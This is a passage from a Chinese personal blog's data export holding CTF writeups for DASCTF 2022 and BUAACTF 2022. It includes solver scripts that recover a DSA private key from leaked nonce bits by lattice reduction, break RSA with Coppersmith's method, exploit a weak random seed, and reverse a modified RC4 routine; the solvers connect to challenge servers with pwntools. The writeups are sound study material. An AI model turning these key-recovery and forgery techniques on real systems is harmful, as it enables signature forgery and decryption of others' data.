{"pages":[{"title":"about","text":"About me太懒了，不想写 想联系我： 扫描下方二维码 wechar或alipay都行 (●’◡’●)","link":"/about/index.html"},{"title":"board","text":"","link":"/board/index.html"}],"posts":[{"title":"2022 DASCTF Mar Writeup","text":"2022 DASCTF Mar Writeup没时间打这比赛，赛后看看大佬的wp学习学习 CryptoFlowerCipher题目描述 123456789101112131415161718192021222324# python3from secret import flagimport random# flag = b'flag{%s}' % md5(something).hexdigest()# note that md5 only have characters 'abcdef' and digitsdef Flower(x, key): flower = random.randint(0, 4096) return x * (key ** 3 + flower)flag = flag[5:-1]rounds = len(flag)L, R = 1, 0for i in range(rounds): L, R = R + Flower(L, flag[i]), Lprint(L, R)'''15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003''' L,R= R_{pre}+L_{pre}*({Key}^3+randint),L_{pre}\\\\ R_pre=L\\%R爆破randint和key即可得到flag 1234567891011121314151617L=15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 R=139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003table=[48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102]flag=[]while L!=1 and R!=0: for rand_i in range(4096): for flag_i in table: if L%R==L-(R*(flag_i**3+rand_i)): flag.append(flag_i) L,R=R,L%R break if len(flag)==32: breakt=''for i in flag: t+=chr(i)print(t[::-1]) 其它解法1)究极暴力解法(29条消息) DASCTF X SU-2022-Crypto-FlowerCipher之暴力暴力求解法(z3约束器)_Mango|Feng的博客-CSDN博客 2)开三次根模拟，更为高效 12345678910111213import gmpy2L = 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899R = 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003flag = ''while L != 1: s = L%R tmp = (L-R)//R flag_b = gmpy2.iroot(tmp,3)[0] flag += chr(flag_b) L = R R = sprint('flag{'+flag[::-1]+'}') meet me in the middle从密钥中泄露的部分位恢复出全部密钥 题目描述： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183from Crypto.Util.number import *from hashlib import sha256import socketserverimport signalimport stringfrom Crypto.Random import randomfrom Crypto.PublicKey import DSAtable = string.ascii_letters + string.digitsBANNER = br'''888b d888 888 888b d888 8888b d8888 888 8888b d8888 88888b.d88888 888 88888b.d88888 888Y88888P888 .d88b. .d88b. 888888 888Y88888P888 .d88b. 888 Y888P 888 d8P Y8b d8P Y8b 888 888 Y888P 888 d8P Y8b 888 Y8P 888 88888888 88888888 888 888 Y8P 888 88888888 888 &quot; 888 Y8b. Y8b. Y88b. 888 &quot; 888 Y8b. 888 888 &quot;Y8888 &quot;Y8888 &quot;Y888 888 888 &quot;Y8888 8888888 888 888 888b d888 d8b 888 888 888 888 888 888 8888b d8888 Y8P 888 888 888 888 888 888 88888b.d88888 888 888 888 888 88888b. 888888 88888b. .d88b. 888Y88888P888 888 .d88888 .d88888 888 .d88b. 888 888 &quot;88b 888 888 &quot;88b d8P Y8b 888 Y888P 888 888 d88&quot; 888 d88&quot; 888 888 d8P Y8b 888 888 888 888 888 888 88888888 888 Y8P 888 888 888 888 888 888 888 88888888 888 888 888 Y88b. 888 888 Y8b. 888 &quot; 888 888 Y88b 888 Y88b 888 888 Y8b. 8888888 888 888 &quot;Y888 888 888 &quot;Y8888 888 888 888 &quot;Y88888 &quot;Y88888 888 &quot;Y8888 '''class DigitalSignatureAlgorithm: def __init__(self, key): self.p = key.p self.q = key.q self.g = key.g self.y = key.y self.x = key.x self.k = [] def sign(self, m): k = random.StrongRandom().randint(1, self.q - 1) self.k.append(k) h = bytes_to_long(sha256(m).digest()) r = pow(self.g, k, self.p) % self.q s = inverse(k, self.q) * (h + self.x * r) % self.q return r, s def verify(self, m, signature): r, s = signature if (not (1 &lt;= r &lt;= self.q - 1)) or (not (1 &lt;= s &lt;= self.q - 1)): return False z = bytes_to_long(sha256(m).digest()) w = inverse(s, self.q) u1 = (z * w) % self.q u2 = (r * w) % self.q v = (pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p % self.q return r == vmyDSA = DigitalSignatureAlgorithm(DSA.generate(1024))MENU = br'''[1] Sign.[2] Verify.[3] Get_public_key.[4] Get_sth_in_the_middle[5] Exit.'''class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self, prompt=b'[-] '): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): proof = (''.join([random.choice(table) for _ in range(12)])).encode() sha = sha256(proof).hexdigest().encode() self.send(b&quot;[+] sha256(XXXX+&quot; + proof[4:] + b&quot;) == &quot; + sha) XXXX = self.recv(prompt=b'[+] Plz Tell Me XXXX :') if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha: return False return True def sign(self): m1 = b'What you want to know' m2 = b'My dear lone warrior' signature1 = myDSA.sign(m1) signature2 = myDSA.sign(m2) self.send(b'Your signature1 is:' + str(signature1).encode()) self.send(b'Your signature2 is:' + str(signature2).encode()) def verify(self): m = self.recv(b'message:') r = int(self.recv(b'r:')) s = int(self.recv(b's:')) signature = (r, s) if m == b&quot;I'm Admin.I want flag.&quot;: if myDSA.verify(m, signature): self.send(b'Hello there.This is what you want.') flag = open('flag').read() self.send(flag.encode()) else: self.send(b'Who are U?Get out!') return False else: self.send(b'Who are U?Get out!') def get_public_key(self): self.send(b'p = ' + str(myDSA.p).encode()) self.send(b'q = ' + str(myDSA.q).encode()) self.send(b'g = ' + str(myDSA.g).encode()) self.send(b'y = ' + str(myDSA.y).encode()) def sth_in_the_middle(self): if len(myDSA.k) == 2: middle_k0 = int(bin(myDSA.k[0])[2:][30:-30], 2) &lt;&lt; 30 middle_k1 = int(bin(myDSA.k[1])[2:][30:-30], 2) &lt;&lt; 30 self.send(b'middle_k0' + str(middle_k0).encode()) self.send(b'middle_k1' + str(middle_k1).encode()) else: self.send(b&quot;The time has not come.&quot;) def handle(self): signal.alarm(60) self.send(BANNER) if not self.proof_of_work(): self.send(b'Oops,you are wrong. Bye~') self.request.close() while 1: self.send(MENU) option = int(self.recv(prompt=b'Give me your option:')) if option == 1: self.sign() elif option == 2: self.verify() break elif option == 3: self.get_public_key() elif option == 4: self.sth_in_the_middle() else: break self.request.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 5000 print(&quot;HOST:POST &quot; + HOST + &quot;:&quot; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 题解没太看懂，大概是通过格基找到最小解，从而恢复密钥（格密码还要学习学习…） 相关论文：1506.pdf (iacr.org) 复制一篇dl的代码学习 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceimport itertoolsfrom Crypto.Util.number import *table = string.ascii_letters+string.digitsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) #最高次项系数化为0 f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i #收集基多项式 for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) print(G) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []def passpow(): io.recvuntil(b&quot;XXXX+&quot;) suffix = io.recv(8).decode(&quot;utf8&quot;) print(suffix) io.recvuntil(b&quot; == &quot;) cipher = io.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method='fixed') io.recvuntil('[+] Plz Tell Me XXXX :') io.sendline(proof.encode()) def sign(m): k = randint(1,q - 1) h = bytes_to_long(sha256(m).digest()) print(f'h = {h}') r = pow(g,k,p) % q s = inverse(k,q) * (h + x * r) % q return r, sio = remote(&quot;node4.buuoj.cn&quot;,26760)passpow()io.recvuntil(&quot;Give me your option:&quot;)io.sendline('3')temp = io.recvline().decode()print(temp)p = int(temp[3:])print(p)temp = io.recvline().decode()print(temp)q = int(temp[3:])print(q)temp = io.recvline().decode()print(temp)g = int(temp[3:])print(g)temp = io.recvline().decode()print(temp)y = int(temp[3:])print(y)io.recvuntil(&quot;Give me your option:&quot;)io.sendline('1')temp = io.recvline()[19:]print(temp)(r1,s1) = eval(temp)print((r1,s1))temp = io.recvline()[19:]print(temp)(r2,s2) = eval(temp)print((r2,s2))io.recvuntil(&quot;Give me your option:&quot;)io.sendline('4')temp = io.recvline()print(temp)mid_k1 = int(temp[9:])print(mid_k1)temp = io.recvline()print(temp)mid_k2 = int(temp[9:])print(mid_k2)h1 = 5440870519694256980135324401094468206014287406674503181088652055917252477781h2 = 90448073438206215877225095258876093094467988960968110779111950984480430764205t = -inverse_mod(s1,q)*s2*r1*inverse_mod(r2,q)u = inverse_mod(s1,q)*r1*h2*inverse_mod(r2,q)-inverse_mod(s1,q)*h1PR.&lt;x1,x2,x3,x4&gt; = PolynomialRing(Zmod(q))c = 1&lt;&lt;130bound = 1&lt;&lt;30f = (x1+mid_k1+c*x2)+t*(x3+mid_k2+c*x4)+uprint(f)ans = small_roots(f,(bound,bound,bound,bound),m=3,d=2)[0]print(ans)k1 = ans[0]+mid_k1+c*ans[1]k2 = ans[2]+mid_k2+c*ans[3]print(f'k1 = {k1} ,k2 = {k2}')x = (s1*k1-h1)*inverse_mod(r1,q)%qmessage = b&quot;I'm Admin.I want flag.&quot;to_send = sign(message)io.recvuntil(&quot;Give me your option:&quot;)io.sendline('2')io.recvuntil(&quot;message:&quot;)io.sendline(b&quot;I'm Admin.I want flag.&quot;)io.recvuntil('r')io.sendline(str(to_send[0]).encode())io.recvuntil('s')io.sendline(str(to_send[1]).encode())io.interactive()# from https://phot0n.com/2022/03/29/DASCTF-2022/ Reverseeasyre带壳，用的万能脱壳工具脱掉壳（脚本小子(lll￢ω￢)） 进到main函数 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ _BYTE v3[50]; // [esp+1Ch] [ebp-74h] BYREF _BYTE v4[50]; // [esp+4Eh] [ebp-42h] BYREF _DWORD v5[3]; // [esp+80h] [ebp-10h] BYREF int v6; // [esp+8Ch] [ebp-4h] sub_40DCF0(); sub_41A070(v5); v6 = sub_41A078(v5); sub_47C7D0(&amp;dword_487F00, v4); if ( strlen((int)v4) != 42 ) exit(&amp;dword_488140, aWrong); if ( v4[0] == 'D' &amp;&amp; v4[1] == 'A' &amp;&amp; v4[2] == 'S' &amp;&amp; v4[3] == 'C' &amp;&amp; v4[4] == 'T' &amp;&amp; v4[5] == 'F' ) { sub_41A080((int)v3, (int)v4); v5[2] = *(_DWORD *)(v6 + 20) + 1900; v5[1] = 0; sub_4019BE((int)v4); //base58 sub_401771((int)v3); //加密 } exit(&amp;dword_488140, aWrong);} 关键函数是sub_401771 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364void __cdecl __noreturn sub_401771(int a1){ int v1[50]; // [esp+1Ch] [ebp-DCh] BYREF int v2; // [esp+E4h] [ebp-14h] int j; // [esp+E8h] [ebp-10h] int i; // [esp+ECh] [ebp-Ch] v2 = strlen(a1); sub_401500(); sub_40152B(); sub_401593(); // KSA sub_401619(a1, v2); for ( i = 0; i &lt; v2; ++i ) byte_492A60[i] = (LOBYTE(dword_492940[i]) ^ *(_BYTE *)(i + a1)) + 71; memset(v1, 0, sizeof(v1)); v1[0] = -61; v1[1] = -128; v1[2] = -43; v1[3] = -14; v1[4] = -101; v1[5] = 48; v1[6] = 11; v1[7] = -76; v1[8] = 85; v1[9] = -34; v1[10] = 34; v1[11] = -125; v1[12] = 47; v1[13] = -105; v1[14] = -72; v1[15] = 32; v1[16] = 29; v1[17] = 116; v1[18] = -47; v1[19] = 1; v1[20] = 115; v1[21] = 26; v1[22] = -78; v1[23] = -56; v1[24] = -59; v1[25] = 116; v1[26] = -64; v1[27] = 91; v1[28] = -9; v1[29] = 15; v1[30] = -45; v1[31] = 1; v1[32] = 85; v1[33] = -78; v1[34] = -92; v1[35] = -82; v1[36] = 123; v1[37] = -84; v1[38] = 92; v1[39] = 86; v1[40] = -68; v1[41] = 35; for ( j = 0; j &lt;= 41; ++j ) { if ( v1[j] != byte_492A60[j] ) sub_41A060(0); } exit(&amp;dword_488140, aRight);} v1就是我们最终的目标密文 点进去前面的几个函数，发现其实是魔改过的RC4加密，sub_401593及之前的函数对应KSA部分，主要修改过的是sub_401593部分 进到sub_401619，该部分用于生成最终的密钥流 1234567891011121314151617181920212223242526272829bool __cdecl sub_401619(int a1, int a2){ int v2; // eax bool result; // al int v4; // [esp+10h] [ebp-10h] int v5; // [esp+14h] [ebp-Ch] int j; // [esp+18h] [ebp-8h] int i; // [esp+1Ch] [ebp-4h] v5 = 0; j = 0; for ( i = 0; ; dword_492940[v5++] = s[(s[j] + s[i]) % 256] ) { v2 = a2--; result = v2 != 0; if ( !result ) break; i = (i + 1) % 256; j = (j + s[i]) % 256; v4 = s[i] + 66; s[i] = s[j] - 33; s[i] ^= 2u; s[j] = 5 * v4; s[j] = s[i] - 10; s[j] += s[i]; s[i] -= 18; } return result;} 主要是进行了一些奇怪的运算，由于流密码的特点我们并不需要对算法做逆向，照着生成密钥流即可 最终exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293def KSA(key):#密钥编排算法，完成S和T的初始化以及S的初始置换 length=len(key) s=[] t=[] for i in range(256): s.append(i) t.append(key[i%length]) j=0 for i in range(256): j=(j+s[i]+t[i])%256 s[i],s[j]=s[j],s[i] return sdef generate_key(s,data):#利用置换后的s产生密钥流 i,j=0,0 k=[] for l in range(len(data)): i=(i+1)%256 j=(j+s[i])%256 v4=s[i]+66 s[i]=(s[j]-33)^2 s[j]=s[i]-10+s[i] s[i]-=18 t=(s[i]+s[j])%256 k.append(s[t]) return kdef Xor(key,data):#用于两个数组间的异或操作 for i in range(len(data)): data[i]^=key[i] return datadef encrypt(data,key):#加密主函数 s=KSA(key) key=generate_key(s,data) result=Xor(key,data) return resultdef decrypt(cipher,key):#解密主函数，由于加密仅是异或操作，此处仅再次调用加密函数即可 result=encrypt(cipher,key) return resulta=[0]*42a[0] = 0xFFFFFFC3a[1] = 0xFFFFFF80a[2] = 0xFFFFFFD5a[3] = 0xFFFFFFF2a[4] = 0xFFFFFF9Ba[5] = 0x30a[6] = 0xBa[7] = 0xFFFFFFB4a[8] = 0x55a[9] = 0xFFFFFFDEa[10] = 0x22a[11] = 0xFFFFFF83a[12] = 0x2Fa[13] = 0xFFFFFF97a[14] = 0xFFFFFFB8a[15] = 0x20a[16] = 0x1Da[17] = 0x74a[18] = 0xFFFFFFD1a[19] = 1a[20] = 0x73a[21] = 0x1Aa[22] = 0xFFFFFFB2a[23] = 0xFFFFFFC8a[24] = 0xFFFFFFC5a[25] = 0x74a[26] = 0xFFFFFFC0a[27] = 0x5Ba[28] = 0xFFFFFFF7a[29] = 0xFa[30] = 0xFFFFFFD3a[31] = 1a[32] = 0x55a[33] = 0xFFFFFFB2a[34] = 0xFFFFFFA4a[35] = 0xFFFFFFAEa[36] = 0x7Ba[37] = 0xFFFFFFACa[38] = 0x5Ca[39] = 0x56a[40] = 0xFFFFFFBCa[41] = 0x23for i in range(len(a)): a[i]=(a[i]-71)%256key=[49, 50, 51, 52, 53, 54]flag=decrypt(a,key)f=''for i in flag: f+=chr(i&amp;0x7f)print(f)# DASCF{Welc0me-t0%j01n-SU#l0ve-suyuS1Qg1e} 奇怪的是最终生成的flag有几位不太对…. 看了一下dl的正确flag是DASCTF{Welc0me-t0-j01n-SU-l0ve-suyug1eg1e} 然后看了一下别人的做法，比较好的是动态调试进到内存中直接调取生成的密钥流，可惜工具脱壳后exe不能运行了，没法调试","link":"/2022/04/05/2022-DASCTF-Mar-Writeup/"},{"title":"1.22刷题记录","text":"1.22 刷题记录摸了好久的鱼了，现在属于是康复训练 testre 2019西湖论剑预选赛拖进ida后第一件事——shift+f12查看字符串 发现base64和base58的码表 随后进入主函数 其中sub_400D00函数只是读取字符串而已，继续查看sub_400700函数 开始时对输入的字符串进行了一次加密，但随后发现加密后的字符串并没有用到 中间进行了一些没有意义的循环和计算 随后就是对输入的字符串分别进行了base58和base64编码 但其实进行比较的是经过base58编码后的字符串 提取比较的字符串：D9cS9N9iHjMLTdA8YSMRMp，进行base58解码即得到flag：base58_is_boring","link":"/2022/01/21/1-22%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"BUAACTF 2022 WP","text":"Writeup of BUAACTF 2022​ Vergissmeinnicht [toc] Web召唤神龙从蝌蚪到龙的每个阶段的图片上都有一个字符，记录下来再拼在一起，就可以得到flag了。 Cryptopow工作量证明机制，对前四位进行爆破即可 123456789101112131415161718def get_pow(know,set): table= ['A', 'B', 'C', 'D','E','F','G','H','I','J','K' ,'L','M','N','O','P','Q','R','S','T','U','V','W','X','Y' ,'Z','a', 'b', 'c', 'd','e','f','g','h','i','j','k','l','m','n','o','p' ,'q','r','s','t','u','v','w','x','y','z','0', '1', '2', '3','4','5','6','7','8','9','+', '/', '='] unknown='' for i1 in table: for i2 in table: for i3 in table: for i4 in table: unknown=i1+i2+i3+i4 hash=hashlib.md5((unknown+know).encode()).hexdigest().encode() # print(hash) if hash==set: return unknown print('?') print(get_pow('fJLX15llIkiMm2ip',b'b43e5db2f4e18ee210cc18376c443883')) ez_game题目描述： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import socketserverfrom time import sleepfrom hashlib import md5from gmpy2 import invertfrom Crypto.Util.number import getPrimefrom random import randintfrom secret import flagMENU = br'''[+] Let's play games!Which game would y like to play?[+] 1. Plz find invert(a,m) when a and m is given(300 asks)[+] 2. Plz find a pair of 'x'and'y' that satisfying x!=y &amp;&amp; md5(x)===md5(y)'''class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self, prompt=b'[-] '): self.send(prompt, newline=False) return self._recvall() def handle(self): self.send(MENU, newline=False) self.send(b&quot;[+] Plz give me your choice: &quot;) ans = int(self.recv().strip().decode()) if ans == 1: for i in range(300): a = m = 1 while a % m == 0 or m % a == 0: a = randint(2,2**8) m = getPrime(6) self.send((&quot;[+] Here is your (a, m): (%s, %s)&quot; % (a, m)).encode()) self.send(b&quot;[+] Plz give me your answer: &quot;) ans = int(self.recv().strip().decode()) if ans != invert(a, m): self.send(b'[!] oops!') break if i == 299: self.send(b'[!] ' + flag[:16]) elif ans == 2: self.send(b&quot;[+] Plz give me your x: &quot;) x = self.recv() self.send(b&quot;[+] Plz give me your y: &quot;) y = self.recv() if (x == y) or (md5(x).hexdigest() != md5(y).hexdigest()): self.send(b'[!] oops!') else: self.send(b'[!] ' + flag[16:]) else: self.send(b'[!] oops!') self.request.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 43089 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 分为两部分，第一部分是重复三百次的求逆运算，用pwntools处理一下；另一部分是找一对md5值相同的碰撞文件，这个可以使用md5碰撞脚本来生成，或者上网找一下md5值相同的文件。 123456789101112131415from pwn import*f1=open('test1','rb').read()f2=open('test2','rb').read()# print(f1)# print(f2)a=remote('101.43.185.64' ,'43089')a.sendlineafter(b'md5(x)===md5(y)',b'2')a.send(f1)sleep(1)a.send(f2)# sleep(1)print(a.recv())a.interactive() 123456789101112131415161718192021222324252627from pwn import*from gmpy2 import invertf1=open('test1','rb').read()f2=open('test2','rb').read()# print(f1)# print(f2)a=remote('101.43.185.64' ,'43089')a.sendlineafter(b'Plz give me your choice:',b'1')for i in range(300): num1='' num2='' a.recvuntil(b&quot;Here is your (a, m): &quot;) gstr=a.recvuntil(b&quot;)&quot;).decode() j=1 while(gstr[j]!=','): num1+=gstr[j] j+=1 j+=1 while(gstr[j]!=')'): num2+=gstr[j] j+=1 # print(num1,num2) m=invert(int(num1),int(num2)) a.sendafter(b&quot; Plz give me your answer: &quot;,str(m).encode())# print(gstr)a.interactive() chaos_generator题目描述： 123456789101112131415161718192021222324252627282930313233from libnum import s2nfrom gmpy2 import next_primefrom random import randintfrom secret import flagdef chaos_maker(p, g, seed): res = 0 x = seed for _ in range(randint(0, 114514)): x = pow(g, x, p) for i in range(256): x = pow(g, x, p) if x &lt; (p-1) // 2: res -= (1 &lt;&lt; i) - 1 elif x &gt; (p-1) // 2: res += (1 &lt;&lt; i) + 1 else: res ^= (1 &lt;&lt; i + 1) return res if res &gt; 0 else -resdef keygen(p, g): u, v = chaos_maker(p, g, randint(0, 1&lt;&lt;64)), chaos_maker(p, g, randint(0, 1&lt;&lt;64)) return next_prime(u**2 + v**2) * next_prime(2*u*v)p = 74318463376311964657848870236469351222861371046000989980725143814597652972079g = 10135979321704650132001133858909900216529170765388975908180263641843583056994N = keygen(p, g)print(N)# N = 46560744052031492000075598084262814175984839629218579003339825251165084535288738001196294968344403225296587992393409186512832442084313772062189640462381680977493272839744503195012137744652370256066011590369737294828406013950810998314546935103160880000499234316605414326064476117367727072344004644766745175963e = 65537c = pow(s2n(flag), e, N)print(c)# c = 23334367507777982721463578689282517343702422017568936413397591619899938216343800551132594869485665306596562901129144338015710969994575939792628945297846703002122172051500112438041566171992504143239954624689779597268840813422509867439815100802585538453946245512563984478922752113443379737653491922857109660034 一道随机数生成器的题目，看算法没啥漏洞，关键在于选取的种子。 检测一下，种子g的阶仅为28361，也就是说经随机数算法生成的随机数总数至多只有28361个，而事实上经脚本爆破后，该随机数生成器的所有随机数只有10000多个。（注意对生成算法稍微修改以提高效率） 123456789101112131415161718192021222324252627p = 74318463376311964657848870236469351222861371046000989980725143814597652972079g = 10135979321704650132001133858909900216529170765388975908180263641843583056994#2*2137*2371544062167676680393339695580229344063914545013798761857806186673744281N = 46560744052031492000075598084262814175984839629218579003339825251165084535288738001196294968344403225296587992393409186512832442084313772062189640462381680977493272839744503195012137744652370256066011590369737294828406013950810998314546935103160880000499234316605414326064476117367727072344004644766745175963# 28362def chaos_maker(p, g, seed): res = 0 x = seed for i in range(256): x = pow(g, x%28361, p) if x &lt; (p-1) // 2: res -= (1 &lt;&lt; i) - 1 elif x &gt; (p-1) // 2: res += (1 &lt;&lt; i) + 1 else: res ^= (1 &lt;&lt; i + 1) return res if res &gt; 0 else -resdef Boom(): pos=[] for i in range(28362): t=chaos_maker(p,g,i) if t not in pos: pos.append(t) return pospos=Boom()print(len(pos))open('111.txt','w').write(str(pos))# print(pow(g,28361,p)) 然后对这一万多种情况搜索生成N所对应的u、v，注意这里需要替换next_prime函数，否则运行效率感人 123456789101112131415N = 46560744052031492000075598084262814175984839629218579003339825251165084535288738001196294968344403225296587992393409186512832442084313772062189640462381680977493272839744503195012137744652370256066011590369737294828406013950810998314546935103160880000499234316605414326064476117367727072344004644766745175963min=Nans1=0ans2=0for i in range(len(a)): for j in (range(i+1,len(a))): tmp=(a[i]**2+a[j]**2)*(2*a[i]*a[j]) if abs(N-tmp)&lt;min: ans1=a[i] ans2=a[j] min=abs(N-tmp)print('end')print(ans1,ans2,N-(ans1**2+ans2**2)*(2*ans1*ans2))# s=next_prime(u**2 + v**2) * next_prime(2*u*v)# print(next_prime(2*u*v),N-s) 12345678p=5776606591131731176687221654555806721589749446513729573168881347635227133113794767302741712092017955351737968930616386238529534813063208506333298381433797c = 23334367507777982721463578689282517343702422017568936413397591619899938216343800551132594869485665306596562901129144338015710969994575939792628945297846703002122172051500112438041566171992504143239954624689779597268840813422509867439815100802585538453946245512563984478922752113443379737653491922857109660034q=N//pe=65537phi=(p-1)*(q-1)d=inverse(e,phi)print(pow(c,d,N))print(n2s(198974677777462547987961272550160914376798574897551434087880206096406625475032831179901)) flag{U_g&amp;5-th3_BA51cs_MY_PaDawan&gt;_&lt;} easyrsa题目描述： 12345678910111213141516171819202122232425262728293031323334from libnum import n2s, s2nfrom random import randrangefrom Crypto.Util.Padding import padfrom Crypto.Util.number import *flag = pad(b'BUAACTF{******************}', 48)def gen(): e = 3 while True: try: p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = inverse(e,phi) if d == 1: continue return p,q,d,n,e except: continue returnp,q,d,n,e = gen()c = pow(s2n(flag), e, n)print(&quot;n = %d&quot;%n)print(&quot;e = %d&quot;%e)print(&quot;c = %d&quot;%c)print(&quot;mbar = %d&quot;%(s2n(flag[:len(flag) // 2]) &lt;&lt; 192))# n = 81990486158830819987073862172415164961593278461441199000999472465202518599850332550812125141470698747706547832071653895197966292731285323989845213159146261837803561813706450672725878328449137240949801181034766354744732582372151328001276074276010039350214840101550595192803830418941509645225250637084951191901# e = 3# c = 29567745406946076830146052374930033424211480116321544674448562777091588294881623860014915348606939136520110465290092616212926800744828796888106944346222024613999754846412634549763305673101149427233979469362411909357450400895307369148973536710380608978693814012874175410588472106640257194122351943446376090522# mbar = 10209587263099434303402268295264783241039304732220412954880929680985232124926643894842588590120872193397691703623680 copper-smith攻击，加密指数仅为3，且泄露了一部分明文，网上直接找个脚本跑就行了 12345678910111213141516171819n = 81990486158830819987073862172415164961593278461441199000999472465202518599850332550812125141470698747706547832071653895197966292731285323989845213159146261837803561813706450672725878328449137240949801181034766354744732582372151328001276074276010039350214840101550595192803830418941509645225250637084951191901e = 3m = randrange(n)c = pow(m, e, n)beta = 1epsilon = beta^2/7nbits = n.nbits()kbits = floor(nbits*(beta^2/e-epsilon)) mbar = 10209587263099434303402268295264783241039304732220412954880929680985232124926643894842588590120872193397691703623680c=29567745406946076830146052374930033424211480116321544674448562777091588294881623860014915348606939136520110465290092616212926800744828796888106944346222024613999754846412634549763305673101149427233979469362411909357450400895307369148973536710380608978693814012874175410588472106640257194122351943446376090522print (&quot;upper %d bits (of %d bits) is given&quot; % (nbits-kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = n1print (mbar + x0)# BUAACTF{Y0u_Know_c0ppersmit_s0_w3ll!!@#$#%~!@!} Block?题目描述： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from secret import flagfrom libnum import s2ns = [0x7, 0x4, 0x9, 0xc, 0xb, 0xa, 0xd, 0x8, 0xf, 0xe, 0x1, 0x6, 0x0, 0x3, 0x2, 0x5]PL1 = [1, 3, 4, 6, 0, 2, 7, 5]PR1 = [2, 7, 5, 0, 1, 6, 4, 3]def leftrow(x, num): left = x &gt;&gt; 32 right = x &amp; 0xffffffff l = ((left &lt;&lt; num) ^ (left &gt;&gt; 32 - num)) &amp; 0xffffffff r = ((right &lt;&lt; num) ^ (right &gt;&gt; 32 - num)) &amp; 0xffffffff return (l &lt;&lt; 32) ^ rdef S(x, bit): after_sbox = 0 for i in range(bit): after_sbox ^= (s[(x &gt;&gt; i * 4) &amp; 0xf] &lt;&lt; i * 4) return after_sboxdef PL(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[PL1[i]] &lt;&lt; (7 - i) * 8) return resdef PR(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[PR1[i]] &lt;&lt; (7 - i) * 8) return resdef encrypt(x, K): x0, x1 = x &gt;&gt; 64, x &amp; 0xffffffffffffffff rk0, rk1 = K &gt;&gt; 64, K &amp; 0xffffffffffffffff x0 = S(x0 ^ rk0, 128 // 8) x1 = S(x1 ^ rk1, 128 // 8) x1 = (x1 ^ x0) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 4)) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 8)) &amp; 0xffffffffffffffff x0 = (x0 